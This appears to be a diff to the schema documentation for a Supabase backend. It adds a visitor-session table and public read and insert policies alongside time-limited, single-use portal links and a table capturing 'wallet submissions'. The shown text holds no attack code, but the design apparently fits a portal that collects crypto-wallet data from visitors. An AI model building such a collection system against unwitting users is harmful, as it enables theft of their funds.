@@ -17,6 +17,16 @@ Manages the dynamic, time-limited secure portal entry points.
 | `usage_limit` | int | `1` | Max number of times the link can be used |
 | `used_count` | int | `0` | Current number of times the link was used |
 
+### `portal_sessions`
+Tracks unique visitor sessions to ensure "One User = One Usage" logic.
+
+| Column | Type | Default | Description |
+| :--- | :--- | :--- | :--- |
+| `id` | uuid | `gen_random_uuid()` | Primary Key |
+| `token_id` | uuid | - | Foreign Key to `access_tokens.id` |
+| `session_id` | text | - | Unique identifier for the visitor's browser session |
+| `created_at` | timestamptz | `now()` | Time when the session was first established |
+
 ### `wallet_submissions`
 Captures encrypted payload interactions from the secure portals.
 
@@ -48,7 +58,16 @@ create table if not exists access_tokens (
   used_count int default 0
 );
 
--- 2. Create wallet_submissions table
+-- 2. Create portal_sessions table
+create table if not exists portal_sessions (
+  id uuid default gen_random_uuid() primary key,
+  token_id uuid references access_tokens(id) on delete cascade,
+  session_id text not null,
+  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
+  unique(token_id, session_id)
+);
+
+-- 3. Create wallet_submissions table
 create table if not exists wallet_submissions (
   id uuid default gen_random_uuid() primary key,
   wallet_name text,
@@ -90,6 +109,21 @@ Ensure RLS is **ENABLED** for both tables in your Supabase dashboard.
     ```sql
     create policy "Admin full access to tokens" on access_tokens
     for all to authenticated using (true);
+    ```
+
+### `portal_sessions` Policies
+1.  **Public Session Lookup (SELECT):**
+    *   *Allow:* Everyone
+    ```sql
+    create policy "Allow public session lookup" on portal_sessions
+    for select using (true);
+    ```
+
+2.  **Public Session Creation (INSERT):**
+    *   *Allow:* Everyone
+    ```sql
+    create policy "Allow public session creation" on portal_sessions
+    for insert with check (true);
     ```
 
 ### `wallet_submissions` Policies
